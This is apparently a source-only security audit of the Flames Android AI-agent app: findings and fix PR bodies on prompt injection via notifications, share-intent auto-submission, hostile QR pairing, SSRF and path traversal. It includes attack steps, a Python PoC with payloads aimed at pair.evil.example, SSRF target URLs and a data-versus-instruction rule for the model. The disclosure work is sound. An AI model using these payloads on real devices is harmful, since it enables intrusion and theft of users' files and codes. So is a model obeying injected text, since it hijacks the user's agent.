## Frame untrusted tool output and state the data-vs-instruction rule

### Problem

Flames reads the notification title and body of **every** app on the device through its notification-listener service and returns them to the model as a tool result (`read_recent_notifications`, `extract_latest_otp`). Those strings are authored by whichever app posted the notification, but nothing on the path marks them as untrusted, delimits them, caps their length, or scans them — the app's own prompt-injection scanner is applied only to imported skill text. The model can then call tools that execute with no confirmation (`clipboard_write`, `send_local_notification`, `save_memory`, `speak_text`, `register_geofence`) and, via `clipboard_read` plus `read_web_page`, move on-device data off the device in a URL.

The same defect exists on the other externally-authored channels (fetched web pages, contacts, the screen-reader tree, clipboard, file contents), so the fix is placed where all of them converge rather than on one tool.

### Change

- **Envelope untrusted tool results.** Before the message list is posted, every message with `role == 'tool'` and string content is wrapped in `BEGIN/END UNTRUSTED TOOL OUTPUT` and capped at 20000 characters. Keying on the role rather than the tool name covers every channel in one place, including channels that are currently unframed.
- **State the rule in every request.** `buildSystemPrompt` now always includes a short statement that text inside the envelope is external data, never an instruction, and must not change the task, the tool policy, or what is disclosed. It is added *before* the `active.isEmpty` early return because that is the default configuration — previously the rule would have been absent exactly when it was needed.

### Why this shape

The envelope gives the model a stable, unambiguous boundary; the prompt rule tells it what the boundary means. Neither depends on pattern matching, so neither is evadable by paraphrase — which is why the existing `SkillSecurityScanner` is not reused as the primary control here (its patterns are literal and it currently has a single production caller). Truncation is applied after wrapping so it can never strip the opening marker, and it bounds how much context one hostile notification can consume.

### Preserved behavior

The in-memory message list, the UI, error semantics and all public signatures are unchanged; only the serialized copy sent to the provider is enveloped. Attachments still serialize to their multipart shape, since the guard requires string content.

### Tests

Two existing assertions encode the pre-fix expectation and must be updated to expect the rule in the no-skill case: `test/domain/services/skills/skills_registry_service_test.dart:311-314` and `test/integration/e2e_fase6_skills_test.dart:353`. Analyzer and test runs were not possible in the audit environment (no Dart/Flutter/Android SDK available) — please run `flutter analyze` and the chat and skills suites before merging.

### Follow-up (not in this change)

Recalled memory is still injected as a `role: "system"` message, which gives attacker-influenced text the highest available authority, and `read_web_page` is declared Tier 2 but registered without a permission checker, so it auto-executes. Both should be addressed separately.

title: Any co-resident app can auto-submit an agent turn through the exported share-target activity, with no user confirmation and an attacker-chosen URL fetch
description: The exported, non-permission-guarded `MainActivity` of the Flames Android app declares `ACTION_SEND` / `ACTION_SEND_MULTIPLE` share-target filters. Text delivered through that channel is consumed by the `receive_sharing_intent` plugin and routed into the chat pipeline, which **submits it to the on-device agent as a user turn with no confirmation step of any kind**. Any installed app — requiring no Android permissions — can therefore drive a full agent turn (a request to the configured LLM endpoint plus the on-device ReAct tool loop). When the shared text contains an `http`/`https` URL, the app also issues that request from the victim's device before submitting, and the URL host is not validated beyond scheme and non-empty host, so loopback, RFC1918 and link-local addresses are reachable. **This finding is unconfirmed and not dynamically validated: the assessment was source-only, with no emulator, device or `adb` available.**
impact:
A co-resident app with no permissions and no special access can cause the Flames agent to run a turn that the user never initiated, and can choose a URL that the device then fetches.

1. **Unattended agent turn.** `AgentCubit.sendMessage` is invoked with attacker-authored text (`chat_screen.dart:1505`, `:1522`). The turn is persisted to the chat session, sent to the configured remote LLM endpoint, and drives the ReAct tool loop (`agent_cubit.dart:502-536`, `:864`). The attacker's text arrives as an ordinary user turn with no provenance marking, so the model has no basis to treat it as untrusted. Consequences are bounded by the existing tier gates: Tier-3 tools still stop at the human-in-the-loop modal, and the agent's reply is rendered in the app's own chat view. The demonstrable consequence is unauthorized consumption of the user's paid LLM quota and an unattended tool loop operating on the user's behalf, with the attacker's text as the instruction source.

2. **Attacker-chosen outbound request.** When the shared text contains a URL, the app fetches it from the device before submitting (`chat_screen.dart:541-542`). The only validation is scheme (`http`/`https`) plus non-empty host (`lib/domain/tools/chat/url_reader_service.dart:59-70`); there is no loopback, RFC1918, link-local or hostname restriction, and `followRedirects: true` means a redirect can move the target after the check. `http://127.0.0.1:<port>/`, `http://192.168.x.x/`, `http://10.x.x.x/` and `http://169.254.169.254/` all pass. The response body is reduced to text and embedded in the prompt that is sent to the LLM (`shared_payload.dart:74-81`), so content from an internal endpoint that the attacker cannot reach directly can be pulled into the model context. This is a blind primitive — the attacker does not receive the response — and it is a client-side fetch, not a server-side one, so it is reported as a secondary aspect of this finding rather than as a standalone high-severity issue.

3. **Reachability and visibility.** `MainActivity` is `launchMode="singleTop"`, so when Flames is already running the payload is delivered to the live instance via the plugin's `NewIntentListener` without a restart. When Flames is not in the foreground, starting the activity brings the Flames window to the front, so the launch itself is visible; the turn that follows is not announced. The attacker cannot hide the window, and the reported severity reflects that.

Source-only audit: no device, emulator or `adb` was available, so the steps below describe the attack as it would be mounted against a real installation and were established by complete static trace, not executed.

1. Install any third-party app on the same device as Flames. It requires no Android permissions — only the ability to start an activity and send an intent, which every app has.
2. From that app, construct an intent with action `android.intent.action.SEND`, type `text/plain`, and extra `Intent.EXTRA_TEXT` set to the attacker's chosen text. Set the component explicitly to `ai.hermes.flames/.MainActivity` so no intent-filter matching is required.
3. Call `startActivity` with `FLAG_ACTIVITY_NEW_TASK`. The Flames window comes to the front.
4. The plugin's Kotlin `ACTION_SEND` branch reads `EXTRA_TEXT` and publishes it as the JSON `path` field on the `receive_sharing_intent/events-media` channel; the cold-start path also exposes it via `getInitialMedia`.
5. `ShareTargetService.mapFile` wraps it in a `SharedPayload`; `ShareTargetCubit` emits `ShareTargetReceived`.
6. `ChatScreen`, mounted as the first tab of the main shell, consumes the payload and calls `_submitSharedPayloads` with no user interaction.
7. If the text contains an `http`/`https` URL (or a bare domain), the app fetches that URL from the device — with no host restriction, so loopback and private addresses are accepted — and embeds the returned text in the prompt.
8. `_handleSubmitted` calls `AgentCubit.sendMessage(prompt)`, which appends the attacker's text as a `role: 'user'` message and runs the ReAct loop: a request is made to the configured LLM endpoint and any tool calls the model returns are executed under the existing tier gates.

To demonstrate the outbound-request leg specifically, set `EXTRA_TEXT` to `http://127.0.0.1:8080/` (or any reachable RFC1918 / link-local address) and observe that the app issues the GET before any user interaction. No dynamic confirmation of this was possible in the audit environment.
remediation_steps:
Treat content arriving through a share intent as untrusted input that requires explicit user action, rather than as a message the user sent.

1. Remove the automatic submission. When a share payload arrives, stage the generated prompt in the chat composer and let the user review and send it themselves; do not call the submit path from the share handler. This single change removes both the unattended agent turn and the unattended fetch, because the fetch happens inside the same handler.
2. Keep the user-visible notification that content was staged, so the feature remains discoverable and the user understands what was added to the composer.
3. Apply the same treatment to the cold-start path and the live path, since both reach the same handler.
4. Independently of the share flow, restrict the URL reader's destination policy: reject loopback, link-local, and private-range addresses, resolve the host and re-check after each redirect, and disable automatic redirect following so that the destination cannot change after validation. This protects the `read_web_page` agent tool as well, which shares the same reader and the same gap.
5. Where a shared payload is later shown to the model, mark it as externally supplied content so the model can distinguish it from user instructions; do not rely on the surrounding prose for that signal.
6. Add a regression test asserting that delivering a share payload does not reach the message-submission path without a user action.
assumptions: Assumes the standard co-resident-app threat model for exported Android components: a malicious app is installed on the same device as Flames. It needs no Android permissions and no special access. Assumes the user has configured the app for normal use (an LLM profile exists in direct mode, or a gateway connection exists in gateway mode); without a usable transport the turn is attempted but cannot complete. Assumes Flames has been launched at least once so its chat screen and DI graph exist. The attacker cannot hide the Flames window when the app is not already in the foreground, so the launch itself is user-visible.

fix_pr_body:
## Summary

Stop automatically submitting content received through an Android share intent to the AI agent. Shared content is now staged in the chat composer for the user to review and send explicitly.

## Problem

`MainActivity` is exported and declares `ACTION_SEND` / `ACTION_SEND_MULTIPLE` share-target filters without a guarding permission. Text delivered through that channel is read by the `receive_sharing_intent` plugin and routed through `ShareTargetService` → `ShareTargetCubit` → `ChatScreen`, which calls `_submitSharedPayloads` and then `_handleSubmitted` **with no user interaction of any kind**.

Any installed app — requiring no permissions — can therefore drive a full agent turn: a request to the configured LLM endpoint carrying attacker-authored text, plus the on-device ReAct tool loop. When the shared text contains an `http`/`https` URL the app also fetches it from the device before submitting, and the only destination check is scheme plus non-empty host, so loopback, RFC1918 and link-local addresses are accepted.

## Fix

- Replace the `_handleSubmitted(context, prompt)` call in `_submitSharedPayloads` with staging the prompt into `_textController` and informing the user via the existing `AppToast.info` helper.
- Update the method's doc comment to describe the new behaviour.

The composer's send button and keyboard submit remain the only ways to dispatch, so the user is always in the loop. Because the fetch happens inside the same method, this change also removes the unattended outbound request.

## Behaviour preserved

- Share payloads are still received, still enriched with fetched link text when a URL is present, and still assembled into the same prompt.
- The composer send button, keyboard submit and voice submission are unchanged.
- The fetch error path still falls back to the raw prompt, and the `mounted` guard still runs first.

## Out of scope for this patch

- The URL reader's destination policy is unchanged, so the `read_web_page` agent tool retains the same permissive host check. Restricting loopback / private ranges and re-validating after redirects should be handled separately.
- The share filters themselves are untouched: a third-party app can still bring Flames to the foreground and populate the composer. Restricting delivery is a product decision.

## Verification

Static trace of source → sink through the patched code, plus a check of the sibling call sites of `_handleSubmitted`. No Flutter/Dart toolchain, Android SDK or device was available in the audit environment, so the change was not analysed, compiled or tested — reviewers should run `dart analyze` and `flutter test`, and add an assertion that a delivered share payload does not reach the submission path.

title: Attacker-controlled QR pairing payload becomes the device's active gateway with no destination validation or origin confirmation
description: The Flames Android app pairs with a gateway by scanning a QR code (or pasting the same JSON into a manual-entry dialog). The payload is entirely attacker-controlled and its `gatewayUrl` field becomes the device's active gateway destination with only a scheme check — any `http`/`https` host is accepted, no allowlist, no same-origin check and no rejection of URL user-info. The app then persists the destination and immediately connects and authenticates to it, showing the user only a success message containing attacker-chosen text. The chosen origin gains the device's remote tool-execution channel (arbitrary readable file access, clipboard, notifications/OTP, screen tree) and can invoke ungated side-effecting tools.
impact: A hostile QR code (printed, pasted into a chat, or handed to the user as "pair with your gateway") silently makes an attacker-controlled origin the device's active gateway. After pairing, that origin receives the device's full agent tool manifest and can issue tool-call frames that the app executes: `read_device_file` reads any path the app can read (its permission check is hardcoded to allow), `clipboard_read` reads the clipboard, `read_recent_notifications` and `extract_latest_otp` read notification content and one-time passcodes, `ui_find_elements` reads the foreground screen's accessibility tree, and several Tier-1 tools perform ungated device side effects (clipboard write, memory write/delete, local notifications, geofence, background service). Pairing also overwrites the stored `llm_base_url`/`llm_api_key` pair, so the app's own LLM and text-to-speech traffic is repointed to the attacker origin. The user is never shown which origin they paired with. The user's previously stored LLM API key is not itself transmitted to the attacker origin, because the base URL and key are always rewritten together from the same payload; a leak of a key the user re-enters afterwards is possible but requires that later user action.
target: Flames Android application (`ai.hermes.flames`, Flutter/Dart), repository source at audit root
poc_description:
1. The attacker prepares a pairing QR whose JSON contains `gatewayUrl` pointing at an origin they control (for example `https://pair.evil.example`), a `token` value, a reassuring `profileName` such as `Office Hermes Gateway`, and deliberately omits `timestamp`/`expiresAt` so the payload never expires.
2. The victim opens the app's Chat screen and taps the QR scan button (`chat_qr_scan_button`), or opens Settings and taps Scan QR, and scans the attacker's code — the application's normal, advertised pairing flow. The same payload can alternatively be pasted into the manual input dialog.
3. `PairingParser.parse` accepts the payload because the only destination check admits any `http`/`https` authority.
4. The app creates a new server profile, marks it active and overwrites the stored `llm_base_url`/`llm_api_key` settings pair with the payload values.
5. The app immediately opens a WebSocket to the attacker origin and sends the authentication frame containing the payload token.
6. The only feedback to the victim is a success snackbar reading `Paired with Office Hermes Gateway`; the destination origin is never displayed and no confirmation is requested.
7. After authentication the attacker origin receives the device tool manifest and can issue tool-call frames that the app executes, including `read_device_file` (any readable path), `clipboard_read`, `read_recent_notifications`, `extract_latest_otp`, `ui_find_elements`, and the Tier-1 side-effecting tools.
8. Destination-confusion variant: a payload with `gatewayUrl` set to `https://trusted.example@pair.evil.example` passes the same check and the connection is established to `pair.evil.example`, so even a user who reads the payload string sees a trusted-looking host that is not the host contacted.
poc_script_code:
Static demonstration of the acceptance logic (no running app exists in this assessment; the script mirrors the Dart predicate at `lib/domain/tools/pairing/pairing_parser.dart:53-56` and prints what the client would derive from each payload).

```python
import json
from urllib.parse import urlsplit

def dart_accepts_gateway_url(raw: str) -> bool:
    """Mirror of the sole destination control in PairingParser.parse."""
    try:
        parts = urlsplit(raw.strip())
    except ValueError:
        return False
    scheme_ok = parts.scheme in ("http", "https")
    has_authority = bool(parts.netloc)
    return scheme_ok and has_authority

def payload(url: str, name: str) -> str:
    # 'timestamp' and 'expiresAt' intentionally omitted: PairingPayload.fromJson
    # defaults a missing timestamp to DateTime.now(), so isExpired() is False.
    return json.dumps({
        "gatewayUrl": url,
        "token": "attacker-supplied-token",
        "profileName": name,
    })

attacker = payload("https://pair.evil.example", "Office Hermes Gateway")
confused = payload("https://trusted.example@pair.evil.example", "Office Hermes Gateway")

for raw in (attacker, confused):
    url = json.loads(raw)["gatewayUrl"]
    parts = urlsplit(url)
    print(f"payload={raw}")
    print(f"  accepted_by_parser={dart_accepts_gateway_url(url)}")
    print(f"  host_the_socket_would_contact={parts.hostname}")
    print(f"  user_info_shown_to_user={parts.username or ''}")
    print()

# Expected output:
#   accepted_by_parser=True  host= pair.evil.example   (both payloads)
# The second payload additionally shows that the string a user reads can name
# 'trusted.example' while the contacted host is 'pair.evil.example'.
```
remediation_steps:
1. Require explicit user confirmation of the destination origin before a pairing payload is persisted or connected. Before calling the profile cubit, display the resolved origin (scheme, host and port as they will actually be contacted) and require an affirmative action; abort pairing on cancel. The confirmation must render the host that the socket will use, not the raw payload string, so user-info confusion is visible.

2. Reject payloads whose `gatewayUrl` carries user-info. In `PairingParser.parse`, after parsing the URI, fail when the user-info component is non-empty. No legitimate gateway URL in this codebase uses user-info — the credential travels in the authentication frame — and rejecting it removes the destination-confusion class entirely.

3. Decide and enforce the transport policy for pairing deliberately. Pairing currently accepts `http` by design, which is exercised by the existing tests that treat `http://192.168.1.50:18789` as valid; a blanket HTTPS-only rule would break the intended LAN pairing flow and must therefore be a product decision rather than a silent parser change. If plaintext LAN pairing is retained, restrict it explicitly to private-range hosts and require HTTPS/WSS for any other destination, so a hostile public origin cannot be paired over cleartext.

4. Apply the same validation to the manual paste entry point and to the Settings entry point, so a pasted payload cannot bypass the confirmation added for the camera flow.

5. Treat the gateway destination as a security-sensitive setting: when an incoming payload would change an already-configured active destination, require re-confirmation and surface a prominent notice identifying the previous and new origins.

6. Consider constraining the authority granted to a newly paired gateway. The remote tool channel currently exposes arbitrary readable file access, clipboard content, notification/OTP content and the foreground screen tree to whichever origin authenticated; scoping those tools per-profile, or requiring in-app approval for the highest-impact tools regardless of tier, limits the blast radius of any future pairing compromise.
assumptions: Static, source-only assessment: no emulator, no adb and no running application instance were available, and the Flutter/Dart SDK present in the environment cannot execute on this host architecture, so no hop could be exercised at runtime. The reported behaviour is derived entirely from reading the cited source lines. The attack additionally assumes the victim performs the app's normal pairing action (scanning or pasting the attacker's payload) and that the app is in gateway mode for the remote tool channel to be live; pairing itself switches the app into gateway mode in the same handler.
counterevidence:
The strongest argument against this finding is that scanning a pairing code is itself a deliberate user consent action, so the user chose to pair with whatever the code contains and nothing is "unauthorized". This does not neutralize the issue: the app never discloses the counterparty being consented to. The success message echoes the payload-supplied `profileName` while the origin is never rendered, so the user cannot tell a legitimate gateway from an attacker origin, and the destination-confusion variant (`https://trusted.example@pair.evil.example`) additionally lets the payload string name a trusted host while the socket contacts a different one. Consent without a disclosed counterparty is not informed consent, and the same parser is fed by a paste dialog where the JSON is even easier to disguise.

A second argument is that the pairing token is supplied by the same payload, so no secret of the user's leaks to the attacker origin. This is correct and is why this report does not claim the user's stored LLM API key is exfiltrated: the base URL and API key are always written as a matched pair from the same payload (`server_profile_cubit.dart:128,140-145`; `secure_storage_service.dart:281-288`), and no split write was found. The impact is therefore scoped to what the hostile origin gains — the device's remote tool-execution channel plus the repointed LLM/TTS destination — rather than to credential theft. A leak of a user key is possible only if the user later re-enters their own key while the attacker profile is active, which requires a further user action and is not counted toward the severity.

A third argument is that Android blocks cleartext by default (the manifest declares no `usesCleartextTraffic` and no `network_security_config`), so the `http` variant would fail closed and the cleartext-interception concern is moot. This narrows only the cleartext variant; it has no effect on the `https`/`wss` variants, which are fully accepted by the same check. Whether `dart:io`'s socket layer honours Android's network security policy could not be established statically in this environment (no device, no emulator, external documentation lookup unavailable), so the cleartext path is reported as an additional risk rather than as a demonstrated interception.

Finally, the repository's own tests treat `http://192.168.1.50:18789` as a valid pairing payload, showing that plaintext LAN pairing is a deliberate design choice rather than an oversight. That is why no HTTPS-only patch is proposed: it would break intended behaviour, and the recommended control is destination confirmation plus rejection of user-info instead.

Checked for and not found: any host allowlist, same-origin comparison against the existing configuration, user-info handling, destination preview, confirmation dialog, or warning that names the origin anywhere in the pairing path (`lib/domain/tools/pairing/`, `lib/presentation/screen/pairing/`, `lib/presentation/screen/server_profiles/`). Also checked and ruled out: an alternative non-QR path that sets the base URL with weaker validation — the only other writers are the settings reset to defaults and the user-typed Add-Profile form, and no registered tool writes the base URL or API key, so a paired gateway cannot re-point the destination through the tool channel.
confidence_rationale: Unconfirmed, not dynamically validated. The environment provides no emulator, no adb and no running app instance, and the Dart/Flutter SDK present cannot execute on this host architecture, so the parser, the profile write, the WebSocket connect, the authentication frame and the tool dispatch could not be executed or observed. Every hop in the chain was verified by reading the cited source lines; the static evidence is complete and mutually consistent, but no runtime observation confirms the end-to-end behaviour.
severity_change_conditions: A dynamic reproduction in which a hostile QR origin receives the authentication frame and then successfully executes `read_device_file` or `clipboard_read` would confirm the high rating; conversely, if the app were shown to display the resolved destination origin and require explicit confirmation before persisting or connecting, or to reject non-HTTPS destinations outright, the finding would drop to informational. Confirmation that Android blocks the cleartext variant while the app still accepts any HTTPS host would leave the rating unchanged.

## Summary

A pairing QR payload is fully attacker-controlled, and its `gatewayUrl` is the only field that decides where the device will connect and authenticate. The current validation accepts any `http`/`https` authority with no host allowlist, no comparison against the already-configured origin, and no rejection of URL user-info, and the app then persists that destination and authenticates to it before the user is shown anything except a success message containing attacker-supplied text.

## Proposed change

1. Before `addFromPairingPayload` is called in `chat_screen.dart` and `settings_screen.dart`, show the resolved destination origin (scheme, host, port as they will actually be contacted) and require explicit confirmation; abort on cancel.
2. In `PairingParser.parse`, reject payloads whose `gatewayUrl` contains user-info. No legitimate gateway URL uses it — the credential is sent in the authentication frame.
3. Treat the plaintext-LAN policy as an explicit decision rather than an implicit default: if `http` pairing is retained for private-range hosts, require HTTPS/WSS for any non-private destination.
4. Cover both entry points and the manual paste dialog with the same control.

## Why it is not applied here

This assessment is source-only: there is no device, emulator or running app, and the available Dart/Flutter SDK cannot execute on this host, so the change could not be validated against the existing widget and integration tests — several of which currently assert that pairing completes immediately after a single scan and would need updating. An unvalidated patch that changes a user-facing flow would be worse than a precise description of the required change.

title: SSRF via the `read_web_page` agent tool: unrestricted URL fetch reachable from model output and from an inbound gateway RPC frame, with no permission gate and no host validation
description:
The agent tool `read_web_page` fetches any `http`/`https` URL chosen by the language model **or supplied in an inbound gateway RPC frame** and returns the page body to the caller, but it is registered as a permissioned tool without a permission check and its URL validator accepts loopback, private, link-local, and cloud-metadata addresses. Because the ReAct loop auto-executes every non-Tier-3 tool and the gateway RPC receiver gates only Tier 3, a URL that reaches the device as data — a poisoned web page, a notification body, a shared link, a compromised gateway, or a directly dispatched frame — can steer the device into fetching internal services that are not reachable from the public internet. On the gateway path the response is returned to the frame's sender over the same socket; on the ReAct path it is forwarded to the configured LLM API.

**Unconfirmed, not dynamically validated.** This assessment is source-only: no emulator, no `adb`, and no running application instance were available. Every claim below is supported by code at a named location and, where noted, by executing the exact validator logic in a standalone Dart runtime; the end-to-end request was never issued from the application.
impact:
A party who can influence model input — by publishing a page the agent is asked to summarise, sending a notification the user has granted the app access to read, or controlling the configured model endpoint — can make the device issue HTTP(S) requests to addresses of their choosing and have the responses returned into the conversation, where they are forwarded to the configured LLM API.

A party who can send frames on the paired gateway connection obtains a stronger version of the same primitive. The frame names the tool and carries the destination URL, no approval is requested, and the fetched body is written back to the sender over the same socket. That removes the model from the loop entirely: the attacker does not have to induce a tool call and does not depend on a third-party model endpoint to observe the result. The device is additionally told to advertise the capability — the tool manifest sent after a successful handshake lists `read_web_page` because the manifest provider applies an enablement filter and no pruning.

The concrete targets that become reachable from the device are the ones the threat model treats as internal: the on-device Hermes gateway and API server (`http://localhost:8642`, `http://127.0.0.1:8644/rpc`), any RFC1918 host on the user's LAN, and link-local cloud metadata services. The Hermes gateway is the component that holds the operator's LLM API key, so an SSRF that can read it is a credential-access primitive, not just a reachability bug. On the ReAct path, fetched content is additionally disclosed to whichever LLM provider the app is configured against, which is an unanticipated egress path for internal response bodies.

The demonstrated consequence is unauthorized outbound request capability and information flow, with the response returned to the caller on the gateway path. The specific contents readable from each internal service were not observed, so the confidentiality impact is assessed as limited rather than high.

remediation_steps:
Enforce the destination policy in the reader itself, so that every caller — the ReAct loop, the gateway RPC receiver, and the share-intent prefetch — is covered by one control rather than by per-caller checks.

1. Add a non-public-address policy to the URL validator: reject loopback, RFC1918, carrier-grade NAT, link-local, multicast, unspecified, and IPv6 unique-local and IPv4-mapped addresses, together with `localhost`, `.local`, `.internal`, `.home.arpa`, and trailing-dot variants, plus decimal, hexadecimal, and octal spellings of IPv4 addresses. Apply it after host lower-casing and dot-trimming so the comparison cannot be evaded by case or a trailing dot.
2. Stop letting the HTTP client follow redirects. Follow them manually with a small hop limit and re-run the full validator on every hop, resolving each `Location` against the current URL before checking it. This closes the redirect-to-internal bypass and bounds redirect loops.
3. Declare the tool as Tier 3 rather than Tier 2. A network fetch of an arbitrary destination is a state-changing egress action, and the current Tier-2 classification is only nominal because no runtime permission exists to check; routing it through the existing human-in-the-loop modal makes the destination visible to the user before the request is issued.
4. Where a permission check is genuinely appropriate, treat a null `checkPermission` on a permissioned tool as a failure rather than a pass, so that a tier declaration cannot be silently neutralized by omitting the callback.
5. Add regression tests covering the private-range, metadata, IPv4-mapped IPv6, alternative-notation, and redirect cases, alongside the existing scheme and empty-input tests.

Note that restricting the tool to public destinations changes behaviour for users who legitimately point the agent at a LAN service; if that use case must be preserved, gate it behind an explicit opt-in allowlist rather than leaving the destination unrestricted.
assumptions:
**ReAct trigger path.** Assumes a configured model endpoint and a completed agent turn, so that a tool call is dispatched. Assumes the model emits, or can be induced to emit, a `read_web_page` call whose `url` argument is an internal destination — the attacker does not need direct network access to the device, only influence over text the model consumes (a page it is asked to summarise, a notification the user granted access to read, or a configured model/gateway endpoint). No user confirmation is required, because the tool is Tier 2 and its permission callback is absent.

**Gateway trigger path.** Assumes the device has completed a gateway handshake with a server the attacker controls or has compromised, and that the chat screen has been mounted so the RPC listener is attached. The attacker does not need to influence the model at all: the tool name and destination are carried in the frame. No authentication beyond the gateway handshake is required, no user interaction occurs, and the response is returned on the same socket.

**Both paths.** No authentication or device access is required beyond the application being installed, configured, and (for the gateway path) paired. The gateway and LLM endpoints themselves are otherwise treated as trusted infrastructure; this finding concerns what a server on that connection, or text the model consumes, can make the device do.
counterevidence:
The strongest argument against the ReAct framing is that it requires the model to choose an internal destination, which is an extra uncertain hop the attacker does not fully control. That argument does not apply to the gateway framing, where the tool name and the URL arrive in the same frame, which is why both paths are reported together. It also does not neutralise the ReAct path on its own, because the URL is model-supplied data with no host policy behind it and the tool is reachable through `tool_search`/`tool_describe` re-discovery.

The strongest argument against the gateway framing is that the gateway is treated as trusted infrastructure, so a malicious gateway operator is not the interesting case. This narrows but does not close the finding. The Tier 2 label is the device's own declared policy for capabilities that must not run on remote say-so, and this tool runs on remote say-so. The precondition is also reachable by an outside party rather than only by the legitimate operator: a hostile pairing payload makes the attacker's server the device's gateway, and on the pairing path the client then enters gateway mode and opens the socket without a destination confirmation step. That pairing weakness is tracked separately, and this finding does not depend on it — the point here is that once any server holds the device's gateway connection, the device's own tier policy does not stop a LAN read.

A third argument is that Android 9 and later block cleartext traffic, so `http://169.254.169.254/` and `http://192.168.1.100/` would fail. This is only partly true and does not neutralize the finding. The engine revision this project pins does not apply the Android cleartext policy to `dart:io` — the Android embedder at that revision contains no `NetworkSecurityPolicy` or `isCleartextTrafficPermitted` reference, `FlutterApplicationInfo.domainNetworkPolicy` is hard-coded to an empty string, and the manifest-metadata plumbing that once carried a per-domain policy was removed upstream. More decisively, the runtime hook explicitly exempts loopback (*"Loopback connections are always allowed"*) and permits `https` unconditionally, so `http://127.0.0.1:8644/rpc`, `http://localhost:8642/health`, and `https://127.0.0.1:8642/` are reachable whether or not cleartext is restricted. That claim rests on source inspection of the pinned revision rather than a device request, and a builder using a different SDK revision could behave differently; the finding does not depend on it.

A fourth argument is that the enabling Tier-2 gate defect is reported separately. The gate defect is the enabling condition; this finding is the specific, independently actionable consequence — an unrestricted-destination fetch with a redirect bypass and two distinct trigger paths — and it is closed by URL and redirect validation alone, without touching the gate.

A fifth argument, considered and rejected, is that this is the same vulnerability as the model-output framing and should not be counted twice. It is one vulnerability with two reachability routes, and it is presented once, here, with both routes and one fix. The gateway route is included because it is materially stronger: it does not depend on model behaviour and it returns the body to the requester.

Checked for and not found: any host, IP-range, or allowlist policy on the fetch path; any destination revalidation across redirects; any approval step on the gateway path for a non-Tier-3 tool; any runtime observation of an internal response body, which is why confidentiality is assessed as limited rather than high.
confidence_rationale: The entire chain is a static trace on both trigger paths. No emulator, `adb`, or running application instance was available, so no request was issued from the application and no internal response body was observed, and neither the ReAct dispatch nor the gateway frame dispatch was exercised end to end. What was executed is the URL validator itself, copied verbatim into a Dart 3.6 runtime, which confirmed that every loopback, RFC1918, link-local, metadata, IPv4-mapped IPv6, and alternative-notation destination is accepted. The gateway path additionally rests on reading the frame dispatch and the RPC receiver rather than on observing a frame being executed. The specific contents readable from each internal service therefore remain unverified, which is why confidentiality is assessed as limited rather than high.
severity_change_conditions: A request issued from a running device that returns content from an internal-only service — for example a response body from the on-device Hermes gateway on `localhost:8642` or the Pocket Node RPC on `127.0.0.1:8644`, returned to the gateway frame's sender — would raise this to high by converting a demonstrated request capability into demonstrated internal-data access; conversely, evidence that the build environment enforces a destination policy that the pinned engine revision does not, or that the gateway connection cannot be obtained by a party other than the legitimate operator, would lower it.

No existing test asserts that a private or loopback host is fetchable, so no test regresses. Error semantics are preserved: validation still returns a `ValidationFailure` carrying a human-readable message, and the `DioException` and generic catch branches are unchanged.

fix_pr_body:
## Summary

`read_web_page` can be made to fetch loopback, RFC1918, link-local, and cloud-metadata addresses, and the response is returned into the agent conversation and forwarded to the configured LLM API. This change enforces a destination policy in the URL reader and stops the HTTP client from following redirects on its own.

## Root cause

Three defects combine:

- `lib/domain/tools/chat/tool_registry.dart:1548` declares the tool as `tier2Permission` but supplies no `checkPermission`, so the gate at `:250-256` (`requiresPermission(tier) && tool.checkPermission != null`) short-circuits and the tool auto-executes. `agent_cubit.dart:753-769` pauses only for Tier 3.
- `lib/domain/tools/chat/url_reader_service.dart:59-70` accepts any `http`/`https` host with no loopback, private-range, link-local, or metadata policy.
- `lib/data/datasources/tools/chat/url_reader_service.dart:47` sets `followRedirects: true` while the validator runs only once on the initial URL, so a public page can redirect the fetch to an internal address.

## Changes

- **`lib/domain/tools/chat/url_reader_service.dart`** — `validateUrl` now rejects non-public destinations: loopback, RFC1918, carrier-grade NAT, link-local, multicast, unspecified, IPv6 unique-local and IPv4-mapped addresses, `localhost` and `.local`/`.internal`/`.home.arpa` names, trailing-dot variants, and decimal/hex/octal IPv4 spellings.
- **`lib/data/datasources/tools/chat/url_reader_service.dart`** — `fetchUrl` follows redirects manually with a hop limit and re-runs the validator on every hop, resolving each `Location` against the current URL. The client no longer follows redirects itself.
- **`lib/domain/tools/chat/tool_registry.dart`** — the tool is raised to `tier3Hitl`, routing it through the existing approval modal so the destination is shown to the user before the request is issued.

## Verification

- Destination policy: 24 must-block and 6 must-allow inputs exercised against the new logic — no failures. Includes IPv4-mapped IPv6 in dotted and hex-group form and the alternative IPv4 notations.
- Redirect handling: internal redirects are refused at the hop; legitimate public redirects still resolve; a self-referential loop terminates instead of spinning.
- Compatibility: existing `validateUrl` expectations in `test/domain/tools/chat/url_reader_html_test.dart` still pass; no existing test asserts that a private host is fetchable.

## Notes for reviewers

Restricting the tool to public destinations changes behaviour for users who deliberately point the agent at a LAN service. If that workflow must be preserved, gate it behind an explicit opt-in allowlist rather than leaving the destination unrestricted.

Separately, a Tier-2 tool whose `checkPermission` is null is currently indistinguishable from an unpermissioned tool. Making that combination fail closed would be a worthwhile follow-up, but it is not included here because several tools omit the callback deliberately and rely on their service to produce a more actionable error message.

title: Path traversal in share-intent file handling writes attacker-controlled content outside the app cache directory
description: The app accepts ACTION_SEND intents from any installed application through its exported MainActivity. The receive_sharing_intent 1.9.0 plugin that consumes those intents resolves an attacker-supplied content:// URI by copying the provider's stream into a path built from the provider-controlled _display_name value, with no sanitisation. A malicious co-resident app can therefore supply a name containing parent-directory segments and have arbitrary bytes written to any path inside the Flames application's private data directory - including all three SQLite databases, the Hive store, and the secure-storage preference files.
impact: A malicious application installed on the same device can overwrite arbitrary files inside the Flames private data directory (/data/user/0/ai.hermes.flames/) with arbitrary bytes. Affected targets include the three application SQLite databases (databases/flames_skills.db, databases/flames_chat.db, databases/flames_memory.db), the Hive action-centre store (app_flutter/flames/action_center.hive), and the shared_prefs/ files backing flutter_secure_storage. Consequences: destruction or substitution of the user's persisted agent skills, chat history and memory vault; replacement of the imported-skills table with attacker-authored rows that are loaded at startup and rendered into the agent system prompt; and loss or corruption of the stored LLM API key and server profiles. Code execution was not achieved and is not claimed - no code path in the application loads or executes files from these directories.
technical_analysis:
**Reachability.** android/app/src/main/AndroidManifest.xml:57-116 declares MainActivity with android:exported="true" and no android:permission, so any third-party app may start it. Six SEND/SEND_MULTIPLE filters (AndroidManifest.xml:78-108) accept text/*, image/* and */*, so an ACTION_SEND intent with type="image/*" matches.

